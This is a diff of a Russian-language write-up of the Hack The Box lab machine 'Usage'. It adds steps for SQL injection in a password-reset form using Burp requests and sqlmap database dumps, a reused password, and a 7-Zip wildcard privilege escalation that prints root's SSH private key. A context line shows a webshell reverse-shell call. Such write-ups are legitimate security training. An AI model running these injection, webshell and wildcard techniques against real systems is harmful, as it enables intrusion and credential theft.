@@ -21,13 +21,94 @@ ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w  /home/kali/Desktop/SecL
 admin                   [Status: 200, Size: 3304...
 
 Прописываем себе:
-echo "10.10.11.18 usage.htb admin.htb" >> /etc/hosts
+echo "10.10.11.18 usage.htb admin.usage.htb" >> /etc/hosts
+
+Изучаем usage.htb и admin.usage.htb
+
+
+SQL_injection
+
+Перебрав директории нарвался на http://usage.htb/forget-password, где попробовал инъекцию с помощью самого банального запроса 1=1'
+Сервер ответил http кодом 500!
+
+select * from users or 1=1'
+Снова 500.
+
+Перехватив запрос в burp, нашёл параметр, куда передаётся наш запрос псевдо почты, для которо якобы надо сбросить пароль
+
+POST /forget-password HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 92
+Origin: http://usage.htb
+Connection: close
+Referer: http://usage.htb/forget-password
+Cookie: XSRF-TOKEN=eyJpdiI6IjVNdUg4UVVFNTVKSDhuMU45OGNjQkE9PSIsInZhbHVlIjoiOTBjVGl0Y1NEYmRpOS9uNG5UM3JXbncvbkVQSmhZY3NMQngxQjZWRmpNeHpjakc0VnhPbXVjTDRmN0VUek5PZGhKMTh1dVhneWo5RTdGVVB5cDNQdDhpcUxQUFp1OWpUdXNMNTM1V3NnYXF3R2xVK2lKVWowMUFsN0dRVEpoKzkiLCJtYWMiOiIzOGVjNjM4MmVmNDEzNjlmMjUzMzZhZDY4NDdhOTZkZTk1NWQxMzdlNTQwYjRiZjhjM2EwYWExNGIzYjU3MjdiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Inptc1dBdXhXZmoyaVRQVEFLK0JvbEE9PSIsInZhbHVlIjoiVU84V0pCcDNzbFdVS3NXd0duRW5obzR5WGtHNmVGWWExMnNyRzJKOFREZGg2UTRtTlBiM0Y1d21BRE43S1ovNVZQTng4UmhvR3NzNExhQ25oVGxmZU1QaGZOOUp3bTR1cVRIc2xUMWw3TERKVVZuWHhsMys2amtVUHFBa0xzTVgiLCJtYWMiOiI5NTI5NTA4MWIyYmIyYWE3Njc2MWMzYjcwODI5ZWY4YjVjZmFjMzllYjE4MGI0NjM0NGFmYzQxM2E5NGU4ZWFmIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+
+_token=Ox7rfQ8dOHPEVq3G5LBxR6uaovro8mqppbtdnVH4&email=select+*+from+users+where++or+1%3D1%27
 
 
 
-SQL_injection в параметре email;
+Получается, что в параметре email мы передаём наши значения, которые сверяются с sql базой, которая нам и будет интересна:
 
-hashcat пароля админа;
+email=select+*+from+users+where++or+1%3D1%27
+
+Если немного погуглить про SQL инъекции, то можно докрутить передаваемые параметры до следующего вида:
+select * from users where email = '' or 1=1;-- -';
+
+
+
+создадим файлик maxhacker.req, который скормим монстру sqlmap.
+В него положим сам запрос.
+
+POST /forget-password HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Origin: http://usage.htb
+Connection: close
+Referer: http://usage.htb/forget-password
+Cookie: XSRF-TOKEN=eyJpdiI6ImZ3d2lOWVh6MGNNRFBhNDN6WWFuYWc9PSIsInZhbHVlIjoiWThZd3dNeWFzNlhML0s0dGFPOTY4bTdpTjRYL1B4bkdMY283ZVFVeUxIdzZSOHc4WEZUR0hXcXM0NWs3ZFBacTZ1OHo2TGRtWUorbGJlbm5WTGFlRDFpVDhOL1htZStVa0phMTc5WndHODdGbnNwQVF1WHpPSGZZaXlhb3NOWUkiLCJtYWMiOiI3OTc1ODA2MjVlYmFhNjlkYWJmNWE3MDNhMWY2NjJkYWRkYTE3ZmI0NWRmMTJlMTMxNjUyOWRhYjMxNDdiZDkwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlMyNkdXV1E3VjZzTGhYcUIzS2daaFE9PSIsInZhbHVlIjoiaTA5Njd5VVR5ZUxRcHkydEpJNEFsMk0yQXVvNk45bWZuWEJXaXpQNm5BTUhwSzRTdHNFdHhuTURDblFkL0JMSmFaYWZMNi9QMm1pK0g3TVVkZ2VUZmlieXVrSFJEOHA0RFUwSUlJY21HbTFUeHdqNm5vNWFwUWtsS0NCMGFXNnAiLCJtYWMiOiJmNzU5MWFkM2U4ODg3MzNmODgxZTk2YjE1YmRlN2FlZDZjMzc2NDE2Y2MxNjNlMDY2Zjc5MDIyZDlkOTgwYmMyIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+
+_token=Ox7rfQ8dOHPEVq3G5LBxR6uaovro8mqppbtdnVH4&email=maxhacker%40thebest.htb
+
+
+
+Запустим sqlmap с нашим запросом, чтобы он смог автоматизированно пробить параметр email своими запросами и достал нам базу.
+Пробуем натравить sqlmap на наш запрос.
+
+sqlmap -r maxhacker.req --batch
+
+После долгих безуспешных запросо указываем уязвимый параметр
+
+sqlmap -r maxhacker.req --level 5 --risk 3 --threads 10 --batch
+
+[INFO] (custom) POST parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
+Хорошие новости!
+[INFO] (custom) POST parameter '#1*' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable
+Ещё лучше!
+[INFO] target URL appears to have 8 columns in query
+Вообще блеск!
+
+
+А теперь, зная, что мы нашли boolean-based blind инъекцию в MySQL, добавим необходимые параметры, чтобы сделать дамп базы и отобразить таблицы
+
+sqlmap --level 5 --risk 3 --threads 2 --batch -r reset-password.req --tables --dump --exclude-sysdb --dbms=mysql
+
+
+подбор пароля админа через hashcat даёт нам пароль администратора сайта.
+
+
 
 
 
@@ -96,12 +177,81 @@ http://admin.usage.htb/uploads/images/maxhacker.php?cmd=bash%20-c%20%27bash%20-i
 
 
 
-поиск кредов для повышения в файлах пользователей;
+Поиск кредов для повышения в файлах пользователей;
+В файле .monitrc пользователя находим пароль 3nc0d3d_pa$$w0rd , который подходит для пользователя xander.
+Подключаемся по ssh под кредами xander:3nc0d3d_pa$$w0rd
 
 
+Оставленный на машине исполняемый ELF файл с своеобразным функционалом;
 
-оставленный на машине исполняемый ELF файл для бэкапирования и танцы с бубном над ним (sudo -l);
 
+xander@usage:/var/www/html$ touch @maxhacker; ln -fs /root/.ssh/id_rsa maxhacker
+xander@usage:/var/www/html$ sudo usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 55109863
+
+Scanning the drive:
+          
+WARNING: No more files
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+
+WARNING: No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+
+
+WARNING: No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+
+
+WARNING: No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+
+
+WARNING: No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+
+
+WARNING: No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+
+
+WARNING: No more files
+-----END OPENSSH PRIVATE KEY-----
+
+2984 folders, 18481 files, 113949914 bytes (109 MiB)                           
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 21465
+
+                                                                               
+Files read from disk: 18481
+Archive size: 55112723 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
+Scan WARNINGS: 7
 
 
 Эксплоит "7za wildcard" и добыча файла id_rsa рута через костыли;
